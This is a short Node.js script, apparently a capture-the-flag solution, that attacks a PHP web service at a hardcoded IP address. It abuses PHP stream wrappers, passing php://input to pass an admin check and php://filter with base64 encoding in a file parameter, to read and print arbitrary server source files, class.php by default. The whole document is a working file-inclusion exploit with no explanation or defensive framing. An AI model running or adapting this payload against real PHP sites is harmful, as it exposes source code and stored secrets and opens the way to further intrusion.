const got = require('got')

const HOST = 'http://120.55.43.255:28119/'

const getBody = (response) => response.body.split('\n')[0].replace(/^hello admin!<br>/, '').trim()

const source = async (filename) => {
  let response = await got.post(`${HOST}/`, {
    searchParams: {
      user: 'php://input',
      file: `php://filter/read=convert.base64-encode/resource=${filename}`,
    },
    body: 'admin',
  })
  return Buffer.from(getBody(response), 'base64').toString()
}

;(async () => {
  let filename = process.argv.slice(2)[0] || 'class.php'
  console.log(await source(filename))
})()
